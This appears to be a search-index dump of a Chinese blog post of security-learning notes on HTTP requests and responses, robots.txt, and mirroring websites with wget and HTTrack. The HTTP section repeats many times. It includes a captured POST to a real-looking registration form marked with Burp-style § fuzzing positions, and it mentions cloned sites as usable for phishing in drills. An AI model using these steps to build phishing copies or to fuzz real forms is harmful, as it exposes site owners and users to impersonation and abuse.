用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http之url"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http协议详解"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求-1"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http响应"},{"categories":["notes"],"content":"\r◎HTTP请求\r◎HTTP之url在浏览器地址栏输入一个URL并按回车即可发起一个HTTP请求。 URL(统一资源定位符)也被称为网页地址 标准格式：协议：//服务器IP[：端口]/路径/[？查询] 例如，https://www.qlu.edu.cn/wxxgk/list.htm ◎服务器域名：www.qlu.edu.cn ◎ 协议：https ◎http默认端口443 ◎路径wxxgk/list.htm ◎HTTP协议详解HTTP协议目前的最新版本是1.1，HTTP是一种无状态的协议，所谓无状态是指Web浏览器与服务器之间不需要建立持久的连接，即当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就关闭了，在服务器端不保留连接的有关信息。 HTTP请求只能由客户端发起，服务器不能主动向客户Duang发送数据。 ◎HTTP请求http请求包含三部分：请求行（请求方法）、请求头（消息报头）、请求正文 下面是学长抓取的例子： POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 Connection: close Content-Length: 171 sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 sec-ch-ua-platform: \"Windows\" Origin: https://www.qlunet.cn Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: https://www.qlunet.cn/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 //空白行，代表请求头结束 number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ //请求正文 ◎第一行是请求行： POST /inc/postdata.php HTTP/1.1 由请求方法（POST），请求路径（/inc/postdata.php）和协议版本（HTTP/1.1）3部分组成。 ◎第二行以下为请求头(也称为消息头)，、请求头由客户端自行设定。请求头与请求正文之间有一个空行 Host：请求的Web服务器域名或者ip地址 USer-Agent：HTTP客户端运行的浏览器类型的详细信息，通过该信息，Web服务器可以判断出当前HTTP请求的客户端浏览器类型，即浏览器的标识 Accept：指定客户端能够接受的内容类型，内容类型的先后次序表示客户端接受的先后次序。 Cookie：HTTP请求发送时，就会把保存在该请求域名下的所有Cookie值一起发送给Web服务器。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 ◎请求正文： number=§1111§\u0026name=§123§\u0026xingbie=§%E7%94%B7§\u0026xueyuan=§%E6%9C%BA%E6%A2%B0%E4%B8%8E%E6%B1%BD%E8%BD%A6%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%99%A2§\u0026phone=§1111§\u0026qq=§1111§\u0026InterestedOrExpert=§1111§ 请求正文常出现在POST请求方法中 ◎HTTP响应HTTP响应也由三部分组成，响应行、响应头(消息报头)和响应正文(消息主题) 下面举一个栗子： HTTP/1.1 200 OK //响应行 Server: JSP3/2.0.14 //响应头 Date: Tue, 28 Sep 2021 14:38:49 GMT Content-Type: text/plain Content-Length: 16792 Connection: close ETag: \"4198-5cce21c6af4c0\" Last-Modified: Sun, 26 Sep 2021 08:53:15 GMT Accept-Ranges: bytes Access-Control-Allow-Origin: * Vary: Accept-Encoding,User-Agent Ohc-Cache-HIT: jncm74 [4] Ohc-Response-Time: 1 0 17 34 68 68 hello //响应正文 第一行为响应行，其中有HTTP版本，状态码(200)以及消息“OK” 第二行至末尾的空白行为响应头，由服务器向客户端发送 HTTP响应头中包含服务器再传递过程中，在响应行中不能完全显示的信息。 Location：控制浏览器重定向到哪个页面。 Server：服务器的banner信息。 Set-Cookie：服务器发送给客户端的Cookie设置信息。 Cache-Control：服务器控制浏览器是否要缓存网页。 消息报头之后为响应正文，是服务器向客户端发送的HTML数据 ◎HTTP请求方法\rHTTP 1.0定义了 GET、HEAD、POST HTTP 1.1新增方法：PUT、DELETE、CONNECT、OPTIONS、TRACE 目前共八种 ◎请求方法中，GET和POST最为常见，两者的区别： 1.GET方法没有请求正文，而POST方法有请求正文 2.GET方法请求数据长度限制，而POST方法请求数据没有长度限制 3.GET方法会在浏览器中显示请求的数据；而POST方法不会在浏览器中显示请求的数据，因此更为安全 （1）GET 用于获取请求页面的指定信息 POST /inc/postdata.php HTTP/1.1 //请求行 Host: bm.swordk.cn //请求头 （2）HEAD HEAD方法除了服务器不能在响应里返回消息主体外，其他都与GET方法相同 此方法常用来检测超文本链接的有效性、可访问性和最近的改变，本方法速度最快 （3）POST POST方法与GET相似，最大的区别在GET方法没有请求内容，而POST方法是有请求内容的。POST请求最多 ◎附：http状态码 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作。 2** 成功，操作被成功接收并处理。 3** 重定向，需要进一步操作以完成请求。 4** 客户端错误，请求包含语法错误或无法完成请求。 5** 服务器错误，服务器在处理请求的过程中发生了错误。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:1:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#http请求方法"},{"categories":["notes"],"content":"\rrobots文件","date":"2022-09-20","objectID":"/web_base-2022.9/:2:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件"},{"categories":["notes"],"content":"\r◎so，what is “robots” ？robots文件是网站和搜索引擎之间的协议，也是搜索引擎爬虫爬行网站的第一个访问的文件，官方叫做爬虫协议或者是机器人协议，robots全程为“网络爬虫排除标准”(Robots Exclusion Protocol)，我们所做的任何网站都可以通过robots协议告诉搜索引擎我们网站的哪些内容可以访问，哪些内容不能访问。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#sowhat-is-robots-"},{"categories":["notes"],"content":"\r◎robots文件的作用1.可以屏蔽网站内一些打不开的链接 2.可以屏蔽搜索引擎蜘蛛访问网站内重复的内容和页面 3.阻止搜索引擎访问网站的隐私性内容 4.阻止搜索引擎访问网站的后台内容 5.告诉搜索引擎哪些内容是需要被访问的 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件的作用"},{"categories":["notes"],"content":"\r◎robots文件的重要性网页中重复页面、内容或者错误页面都可以通过robots文件来屏蔽或阻止访问，否则搜索引擎蜘蛛就会认为该网站的价值较低，从而导致搜索引擎给网站的评价降低，会直接导致我们的网站排名下降。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:2:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#robots文件的重要性"},{"categories":["notes"],"content":"\r网站克隆","date":"2022-09-20","objectID":"/web_base-2022.9/:3:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#网站克隆"},{"categories":["notes"],"content":"\r前言当离线时，拥有 一份镜像进行持续观察很有效。Wooyun 被封杀，但是现在网上还有很多 Wooyun 镜像站，来继续发挥 Wooyun 的余热。镜像网站不会复制动态内容，也不会复制网站的中间件，因此这并不是对所有渗透测试环境都适用。国光我个人一般都是用来 “盗取” 炫酷的 HTML5 网站（嘘～～～），有时候用它离线存储一些网站，总之挺实用的。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#前言"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用-wget-复制克隆网站"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#介绍"},{"categories":["notes"],"content":"\r使用 wget 复制克隆网站\r介绍Kali linux 默认安装了 wget 工具，它简单使用，Pentest Box 中也集成了 wget 命令，只要在终端下敲几个命令，就可以下载整个网站的 HTML 文件。wget 不能复制服务器的程序页面，例如 PHP 脚本页面。 使用方法终端下输入: BASH wget -m -p -E -k -K -np -v http://www.baidu.com 这样就会把百度的首页复制下来，就是这么简单粗暴。这里使用了一连串的参数，可以使用 man 命令来查看 wget 的手册： BASH man wget wget 的主要参数如下: VERILOGm: 镜像，选择该选项适用于 Web 站点 p: 页面获先决条件，该选项确保 包含了请求的 图片和 CSS 脚本文件被下载 (这样可以更好的复制 HTML5 的站点) E: 适用扩展，这可以在本地另存为一个 HTML 文件 k: 转换链接，确保文件被转换，用于本地浏览 K: 转换备份文件，将会以 orig 为后缀作为原始文件 复制网站时可能会发生错误，尤其是在复制动态脚本页面的时候，这是因为生成页面的大部分代码是由动态脚本创建的，大部分站点的应用程序是不能访问到的。 注：文件一旦被下载，切忌不可以让其他人浏览和重新发布站点，这会违反版权法。（当然功放演练的话，钓鱼攻击除外） 在Linux终端中进行wget操作是，保存下来的文件会保存在终端当前所在的目录 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用方法"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用-httrack-复制克隆网站"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 